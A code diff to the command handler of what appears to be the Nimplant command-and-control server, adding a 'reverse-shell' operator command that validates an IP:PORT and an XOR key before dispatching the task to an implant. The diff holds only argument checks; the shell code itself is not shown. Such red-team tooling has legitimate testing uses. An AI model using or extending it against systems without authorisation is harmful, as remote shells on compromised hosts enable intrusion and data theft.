@@ -158,6 +158,40 @@ def handle_command(raw_command, np: NimPlant = None):
         elif cmd == "powershell":
             commands.powershell(np, args, raw_command)
 
+        elif cmd == "reverse-shell":
+            # Pre-validation before calling the main function
+            if len(args) < 2:
+                handle_local_command(np, raw_command, 
+                    "Invalid number of arguments received. Usage: 'reverse-shell <IP:PORT> <XOR_KEY>'."
+                )
+                return
+            
+            # Validate IP:PORT format
+            ip_port = args[0]
+            if ":" not in ip_port:
+                handle_local_command(np, raw_command,
+                    "Invalid IP:PORT format. Usage: 'reverse-shell <IP:PORT> <XOR_KEY>'."
+                )
+                return
+                
+            # Validate XOR_KEY format
+            xor_key = args[1]
+            try:
+                if xor_key.startswith("0x"):
+                    # Hex format
+                    int(xor_key[2:], 16)
+                else:
+                    # Decimal format
+                    int(xor_key)
+            except ValueError:
+                handle_local_command(np, raw_command,
+                    "Invalid XOR key. Must be a number (decimal or hex with 0x prefix)."
+                )
+                return
+                
+            # If all validations pass, call the function
+            commands.reverse_shell(np, args, raw_command)
+
         # Handle commands that do not need any server-side handling
         elif cmd in nimplant_cmds:
             guid = np.add_task(list([cmd, *args]), task_friendly=raw_command)
